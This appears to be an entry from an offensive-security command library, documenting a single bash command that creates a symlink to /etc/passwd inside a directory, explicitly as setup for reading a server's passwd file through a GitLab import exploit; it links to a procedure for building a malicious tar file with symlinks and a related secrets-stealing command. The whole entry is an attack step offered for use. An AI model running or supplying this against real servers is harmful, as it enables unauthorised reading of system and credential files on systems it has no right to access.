---
id: e01f0704-fed4-4878-825b-7dd831c02b52
type: command
executor: bash
data: ln -s /etc/passwd ./d3209c811fee407218bff7cb3b4333e6/passwd
output: null
created_at: '2025-12-11T03:48:05.898Z'
updated_at: '2025-12-11T03:48:05.898Z'
platforms:
  - Linux
tags:
  - symlink
verified: false
validated: true
submitted: true
---

# ln-symlink-passwd

## Command

```bash
ln -s /etc/passwd ./d3209c811fee407218bff7cb3b4333e6/passwd
```

## Description

Create a symbolic link to /etc/passwd inside the directory, setting up for reading the server's passwd file via GitLab import exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Create symbolic link | Yes |
| `/etc/passwd` | Target file | Yes |
| `./d3209c811fee407218bff7cb3b4333e6/passwd` | Symlink path | Yes |

## Examples

### Basic Usage

```bash
ln -s /etc/passwd ./d3209c811fee407218bff7cb3b4333e6/passwd
```

## Expected Output

Creates the symlink without output if successful.

## Related

- [[procedures/Create-Malicious-Tar-File-with-Symlinks]]
- [[commands/ln-symlink-secrets]]
